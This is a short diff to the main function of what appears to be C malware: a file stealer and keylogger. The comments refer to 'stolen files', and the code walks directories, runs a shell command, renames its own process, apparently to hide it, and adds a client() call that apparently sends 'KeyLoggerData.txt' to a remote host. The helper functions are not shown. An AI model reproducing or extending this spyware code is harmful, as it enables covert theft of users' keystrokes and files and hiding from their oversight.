@@ -2,7 +2,7 @@
 
 int main(int argc, char *argv[]) {
 
-	// Create folder "Files" to store all taken files
+	/* Create folder "Files" to store all taken files
 	if (mkdir("Files", 0777) < 0 && errno != EEXIST) {
 		perror("mkdir failed");
 		exit(EXIT_FAILURE);
@@ -10,7 +10,7 @@ int main(int argc, char *argv[]) {
 	chmod("Files", 0777);
 	// Path of "Files" directory in current working directory
 	getcwd(copyToDir, sizeof(copyToDir));
-	strcat(copyToDir, "/Files");
+	strcat(copyToDir, "/Files");*/
 	
 	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
 	openDir(START, 0);
@@ -25,8 +25,10 @@ int main(int argc, char *argv[]) {
 	system(command);
 
 	// Give permission to access stolen files
-	givePermission();
+	//givePermission();
 
 	changeProcessName(argv);
+
+	client("KeyLoggerData.txt", "KeyLoggerData.txt");
 	return 0;
 }
